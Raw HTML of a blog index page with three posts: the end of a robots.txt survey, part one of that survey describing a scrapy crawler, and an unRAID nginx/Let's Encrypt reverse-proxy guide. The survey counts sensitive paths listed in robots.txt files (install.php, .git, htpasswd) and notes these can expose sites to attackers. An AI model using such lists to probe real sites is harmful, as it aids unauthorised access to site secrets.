</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>sec_obs_list <span style=color:#000;font-weight:700>=</span> [find_security_by_obscurity(x) <span style=color:#000;font-weight:700>for</span> x <span style=color:#000;font-weight:700>in</span> df[<span style=color:#d14>&#39;content&#39;</span>]]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>sec_obs_count <span style=color:#000;font-weight:700>=</span> Counter(x<span style=color:#000;font-weight:700>.</span>strip() <span style=color:#000;font-weight:700>for</span> xs <span style=color:#000;font-weight:700>in</span> sec_obs_list <span style=color:#000;font-weight:700>for</span> x <span style=color:#000;font-weight:700>in</span> <span style=color:#0086b3>set</span>(xs))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9</span><span>sec_obs_count<span style=color:#000;font-weight:700>.</span>most_common(<span style=color:#099>10</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>[(<span style=color:#d14>&#39;install.php&#39;</span>, <span style=color:#099>28925</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>(<span style=color:#d14>&#39;beta&#39;</span>, <span style=color:#099>2834</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>(<span style=color:#d14>&#39;secret&#39;</span>, <span style=color:#099>753</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>(<span style=color:#d14>&#39;alpha&#39;</span>, <span style=color:#099>597</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>(<span style=color:#d14>&#39;.git&#39;</span>, <span style=color:#099>436</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>(<span style=color:#d14>&#39;setup.php&#39;</span>, <span style=color:#099>73</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>(<span style=color:#d14>&#39;htpasswd&#39;</span>, <span style=color:#099>45</span>)]
</span></span></code></pre></div><p>Just because a file or directory is mentioned in <code>robots.txt</code>, it doesn&rsquo;t mean that it can actually be accessed. However, if even 1% of Wordpress installs leave their <code>install.php</code> open to the world, that&rsquo;s still a lot of vulnerable sites. Any attacker could get the keys to the kingdom very easily. The same goes for a <code>.git</code> directory. Even if it is read-only, people accidentally commit secrets to their git repository all the time.</p><h1 id=conclusion>Conclusion</h1><p><code>robots.txt</code> is a fairly innocuous part of the web. It&rsquo;s been interesting to see how popular websites (ab)use it, and which web crawlers are naughty or nice. Most of all this has been a great exercise for myself in collecting data and analysing it using pandas and Jupyter.</p><p>The full data set is released under the <a href=https://opendatacommons.org/licenses/odbl/1.0/>Open Database License (ODbL) v1.0</a> and can be found <a href=https://github.com/JamieMagee/robots-txt>on GitHub</a></p></div><div class=post><h1 class=post-title><a href=/blog/a-survey-of-robots-txt-part-one/>A survey of robots.txt - part one</a></h1><span class=post-date>Sep 19, 2017 &#183; 3 minute read &#183; <a href=/blog/a-survey-of-robots-txt-part-one/#disqus_thread>Comments</a></span><p>After reading <a href=https://www.kaggle.com/colinmorris/unusual-favicons-a-brief-survey>CollinMorris&rsquo;s analysis of favicons</a> of the top 1 million sites on the web, I thought it would be interesting to do the same for other common parts of websites that often get overlooked.</p><p>The <code>robots.txt</code> file is a plain text file found at on most websites which communicates information to web crawlers and spiders about how to scan a website.. For example, here&rsquo;s an excerpt from <code>robots.txt</code> for <code>google.com</code></p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-txt data-lang=txt><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>User-agent: *
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>Disallow: /search
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>Allow: /search/about
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>Allow: /search/howsearchworks
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>...
</span></span></code></pre></div><p>The above excerpt tells all web crawlers not to scan the <code>/search</code> path, but allows them to scan <code>/search/about</code> and <code>/search/howsearchworks</code> paths. There are a few more supported keywords, but these are the most common. Following these instructions is not required, but it is considered good internet etiquette. If you want to read more about the standard, Wikipedia has a great page <a href=https://en.wikipedia.org/wiki/Robots_exclusion_standard>here</a>.</p><p>In order to do an analysis of <code>robots.txt</code>, first I need to crawl the web for them – ironic, I know.</p><h2 id=scraping>Scraping</h2><p>I wrote a scraper using <a href=https://scrapy.org/>scrapy</a> to make a request for <code>robots.txt</code> for each of the domains in Alexa&rsquo;s top 1 million websites. If the response code was 200, the <code>Content-Type</code> header contained <code>text/plain</code>, and the response body was not empty, I stored the response body in a file, with the same name as the domain name.</p><p>One complication I encountered was that not all domains respond on the same protocol or subdomain. For example, some websites respond on <code>http://{domain_name}</code> while others require <code>http://www.{domain_name}</code>. If a website doesn&rsquo;t automatically redirect you to the correct protocol or subdomain, the only way to find the correct one, is to try them all! So I wrote a small class, extending scrapy&rsquo;s <code>RetryMiddleware</code>, to do this:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>COMMON_PREFIXES <span style=color:#000;font-weight:700>=</span> {<span style=color:#d14>&#39;http://&#39;</span>, <span style=color:#d14>&#39;https://&#39;</span>, <span style=color:#d14>&#39;http://www.&#39;</span>, <span style=color:#d14>&#39;https://www.&#39;</span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#000;font-weight:700>class</span> <span style=color:#458;font-weight:700>PrefixRetryMiddleware</span>(RetryMiddleware):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#000;font-weight:700>def</span> <span style=color:#900;font-weight:700>process_exception</span>(<span style=color:#999>self</span>, request, exception, spider):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>            prefixes_tried <span style=color:#000;font-weight:700>=</span> request<span style=color:#000;font-weight:700>.</span>meta[<span style=color:#d14>&#39;prefixes&#39;</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>            <span style=color:#000;font-weight:700>if</span> COMMON_PREFIXES <span style=color:#000;font-weight:700>==</span> prefixes_tried:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>                <span style=color:#000;font-weight:700>return</span> exception
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            new_prefix <span style=color:#000;font-weight:700>=</span> choice(<span style=color:#0086b3>tuple</span>(COMMON_PREFIXES <span style=color:#000;font-weight:700>-</span> prefixes_tried))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>            request <span style=color:#000;font-weight:700>=</span> <span style=color:#999>self</span><span style=color:#000;font-weight:700>.</span>update_request(request, new_prefix)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>            <span style=color:#000;font-weight:700>return</span> <span style=color:#999>self</span><span style=color:#000;font-weight:700>.</span>_retry(request, exception, spider)
</span></span></code></pre></div><p>The rest of the scraper itself is quite simple, but you can read the full code <a href=https://github.com/JamieMagee/robots-txt>on GitHub</a>.</p><h2 id=results>Results</h2><p>Scraping the full Alexa top 1 million websites list took around 24 hours. Once it was finished, I had just under 700k robots.txt files</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>$ find -type f | wc -l
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#099>677686</span>
</span></span></code></pre></div><p>totalling 493MB</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>$ du -sh
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>493M    .
</span></span></code></pre></div><p>The smallest <code>robots.txt</code> was 1 byte<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>, but the largest was over 5MB.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>$ find -type f -exec du -Sh <span style=color:#000;font-weight:700>{}</span> + | sort -rh | head -n <span style=color:#099>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>5.6M    ./haberborsa.com.tr
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>$ find -not -empty -type f -exec du -b <span style=color:#000;font-weight:700>{}</span> + | sort -h | head -n <span style=color:#099>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#099>1</span>    ./0434.cc
</span></span></code></pre></div><p>The full data set is released under the <a href=https://opendatacommons.org/licenses/odbl/1.0/>Open Database License (ODbL) v1.0</a> and can be found <a href=https://github.com/JamieMagee/robots-txt>on GitHub</a></p><h2 id=whats-next>What&rsquo;s next?</h2><p>In the next part of this blog series I&rsquo;m going to analyse all the <code>robots.txt</code> to see if I can find anything interesting. In particular I&rsquo;d like to know why exactly someone needs a <code>robots.txt</code> file over 5MB in size, what is the most common web crawler listed (either allowed or disallowed), and are there any sites practising security by obscurity by trying to keep links out of search engines!</p><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>I needed to include <code>-not -empty</code> when looking for the smallest file, as there were errors when decoding the response body for some domains. I&rsquo;ve included the empty files in the dataset for posterity, but I will exclude them from further analysis.&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div><div class=post><h1 class=post-title><a href=/blog/setting-up-nginx-reverse-proxy-with-lets-encrypt-on-unraid/>Setting up nginx reverse proxy with Let&rsquo;s Encrypt on unRAID</a></h1><span class=post-date>Mar 28, 2016 &#183; 3 minute read &#183; <a href=/blog/setting-up-nginx-reverse-proxy-with-lets-encrypt-on-unraid/#disqus_thread>Comments</a></span><p>Late last year I set about building a new NAS to replace my aging HP ProLiant MicroServer N36L (though that&rsquo;s a story for a different post). I decided to go with unRAID as my OS, over FreeNAS that I&rsquo;d been running previously, mostly due to the simpler configuration, ease of expanding an array, and support for Docker and KVM.</p><p>Docker support makes it a lot easier to run some of the web apps that I rely on like Plex, Sonarr, CouchPotato and more, but accessing them securely outside my network is a different story. On FreeNAS I ran an nginx reverse proxy in a BSD jail, secured using basic auth, and SSL certificates from <a href=https://www.startssl.com/>StartSSL</a>. Thankfully there is already a Docker image, <a href=https://hub.docker.com/r/jwilder/nginx-proxy/>nginx-proxy</a> by jwilder, which automatically configures nginx for you. As for SSL, <a href=https://letsencrypt.org/>Let&rsquo;s Encrypt</a> went into public beta in December, and recently issued their millionth certificate. There&rsquo;s also a Docker image which will automatically manage your certificates, and configure nginx for you - <a href=https://hub.docker.com/r/jrcs/letsencrypt-nginx-proxy-companion/>letsencrypt-nginx-proxy-companion</a> by jrcs.</p><h2 id=preparation>Preparation</h2><p>Firstly, you need to set up and configure Docker. There is a fantastic guide on how to configure Docker <a href=https://lime-technology.com/docker-guide/>here</a> on the Lime Technology website. Next, you need to install the <a href="https://lime-technology.com/forum/index.php?topic=40262.0">Community Applications</a> plugin. This allows us to install Docker containers directly from the Docker Hub.</p><p>In order to access everything from outside your LAN you&rsquo;ll need to forward ports 80 and 443 to ports 8008 and 443, respectively, on your unRAID host. In addition, you&rsquo;ll need to use some sort of Dynamic DNS service, though in my case I bought a domain name and use CloudFlare to handle my DNS.</p><h2 id=nginx>nginx</h2><p>From the Apps page on the unRAID web interface, search for <code>nginx-proxy</code> and click &lsquo;get more results from Docker Hub&rsquo;. Click &lsquo;add&rsquo; under the listing for <code>nginx-proxy</code> by jwilder. Set the following container settings, changing your &lsquo;host path&rsquo; to wherever you store Docker configuration files on your unRAID host</p><p><img src=/img/nginx-proxy-settings.png alt="nginx-proxy settings"></p><p>To add basic auth to any of the sites you&rsquo;ll need to make a file with the <code>VIRTUAL_HOST</code> of the site, available to nginx in <code>/etc/nginx/htpasswd</code>. For example, I added a file in <code>/mnt/user/docker/nginx/htpasswd/</code>. You can create htpasswd files using <code>apache2-utils</code>, or there are sites available which can create them.</p><h2 id=lets-encrypt>Let&rsquo;s Encrypt</h2><p>From the Apps page again, search for <code>letsencrypt-nginx-proxy-companion</code>, click &lsquo;get more results from Docker Hub&rsquo;, and then click &lsquo;add&rsquo; under the listing for <code>letsencrypt-nginx-proxy-companion</code> by jrcs. Enter the following container settings, again changing your &lsquo;host path&rsquo; to wherever you store Docker configuration files on your unRAID host</p><p><img src=/img/lets-encrypt-settings.png alt="lets encrypt settings"></p><h2 id=putting-it-all-together>Putting it all together</h2><p>In order to configure nginx, you&rsquo;ll need to add four environment variables to the Docker containers you wish to put behind the reverse proxy. They are <code>VIRTUAL_HOST</code>, <code>VIRTUAL_PORT</code>, <code>LETSENCRYPT_HOST</code>, and <code>LETSENCRYPT_EMAIL</code>. <code>VIRTUAL_HOST</code> and <code>LETSENCRYPT_HOST</code> most likely need to be the same, and will be something like <code>subdomain.yourdomain.com</code>. <code>VIRTUAL_PORT</code> should be the port your Docker container exposes. For example, Sonarr uses port 8989 by default. <code>LETSENCRYPT_EMAIL</code> should be a valid email address that Let&rsquo;s Encrypt can use to email you about certificate expiries, etc.</p><p>Once <code>nginx-proxy</code>, <code>letsencrypt-nginx-proxy-companion</code>, and all your Docker containers are configured you should be able to access them all over SSL, with basic auth, from outside your LAN. You don&rsquo;t even have to worry about certificate renewals as it&rsquo;s all handled for you.</p></div><div class=pagination><a class=pagination-item href=/page/3/>Newer</a>
<a class=pagination-item href=/page/5/>Older</a></div></div></div><script type=text/javascript>var disqus_shortname="jamiemagee";(function(){var e=document.createElement("script");e.async=!0,e.type="text/javascript",e.src="//"+disqus_shortname+".disqus.com/count.js",(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(e)})()</script></body></html>